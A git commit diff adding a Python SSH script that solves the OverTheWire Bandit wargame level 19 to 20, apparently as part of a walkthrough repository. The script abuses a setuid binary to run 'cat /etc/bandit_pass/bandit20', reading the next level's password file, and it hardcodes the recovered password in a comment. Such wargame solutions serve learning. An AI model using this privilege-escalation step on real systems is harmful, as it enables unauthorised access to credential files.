a3616508b917b16891554acc3797315cc98edb34
Adrian Kristanto <49110670+adriankristanto@users.noreply.github.com>
2020-07-18 17:36:33 +1000

    added the guide for bandit19 -> bandit20

--- bandit19/bandit19.py
+++ bandit19/bandit19.py
@@ -14,4 +14,14 @@ client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
 print('connecting...\n')
 client.connect(hostname=utils.ADDRESS, port=utils.PORT, username=USERNAME, password=PASSWORD)
 
+# escalate our privilege to access bandit20 password using the misconfigured setuid binary 
+print("./bandit20-do cat /etc/bandit_pass/bandit20")
+_, stdout, _ = client.exec_command("./bandit20-do cat /etc/bandit_pass/bandit20")
+stdout = stdout.readlines()
+utils.print_stdout(stdout)
+password = utils.get_password(stdout)
+
+# bandit20 password: GbKksEFF4yrVs6il55v6gwY5aVje5f0j
+print(f"bandit20 password: {password}")
+
 client.close()
